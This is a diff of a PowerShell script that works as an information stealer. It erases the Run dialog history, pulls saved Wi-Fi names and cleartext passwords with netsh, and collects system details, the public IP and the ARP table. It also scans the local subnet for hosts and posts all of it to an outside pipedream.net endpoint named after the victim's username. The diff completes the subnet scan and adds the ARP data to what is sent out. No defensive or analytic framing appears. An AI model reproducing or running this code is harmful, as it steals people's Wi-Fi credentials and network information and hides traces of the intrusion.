@@ -44,14 +44,17 @@ function Find-LANHosts {
 }
 
 Remove-Item -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Recurse
-$wifi = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | ForEach-Object {echo "{$name : $pass}`n"}
-$info = Get-ComputerInfo | Out-String
-$public = Invoke-RestMethod -Uri ('http://ipinfo.io/'+(Invoke-WebRequest -uri "http://ifconfig.me/ip").Content)
 $local = (Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.status -ne "Disconnected"})
 $ip = $local.IPv4Address.IPAddress.split(".")
+$tmp = $ip[0] +'.'+ $ip[1] +'.'+ $ip[2] +'.'
 $local = (Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.status -ne "Disconnected"}) | Out-String
-$lan = Find-LANHosts -ip @(($test|%{"$ip$_"}))
+$lan = Find-LANHosts -ip @((0..255|%{"$tmp$_"})) | Out-String
+$wifi = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | ForEach-Object {echo "{$name : $pass}`n"}
+$info = Get-ComputerInfo | Out-String
+$public = Invoke-RestMethod -Uri ('http://ipinfo.io/'+(Invoke-WebRequest -uri "http://ifconfig.me/ip").Content) | Out-String
+
+Start-Sleep -s 2
 
 $net = arp -a | Out-String
-$data = $wifi + $local + $public + $lan + $info 
+$data = $wifi + $local + $public + $lan + $net + $info 
 Invoke-RestMethod https://encssv4vtly2.x.pipedream.net/$(whoami) -Method Post -Body $data
